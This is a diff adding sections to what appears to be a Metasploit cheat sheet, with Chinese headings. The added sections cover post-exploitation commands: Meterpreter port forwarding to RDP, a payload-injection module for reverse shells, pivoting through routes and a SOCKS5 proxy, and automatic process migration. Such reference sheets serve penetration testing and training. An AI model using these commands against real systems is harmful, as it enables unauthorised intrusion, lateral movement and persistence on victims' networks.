@@ -72,6 +72,51 @@ makerc <name>
 
 
 
+### 端口转发
+
+```
+portfwd add -l 2222 -r 192.168 -p 3389  
+```
+
+
+
+### 使用其他协议反弹shell
+
+```
+use  windows/local/payload_inject
+```
+
+
+
+### pivot + socks5代理
+
+```
+route add 10.10.10.1 255.255.255.0 1
+route print
+
+use auxiliary/server/socks_proxy 
+show options
+run
+```
+
+
+
+### Socks5代理
+
+```
+export ALL_PROXY=socks5://127.0.0.1:1080
+```
+
+
+
+### 自动迁移
+
+```
+set AutoRunScript migrate -f  自动迁移进程
+```
+
+
+
 ### Handlers
 
 Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
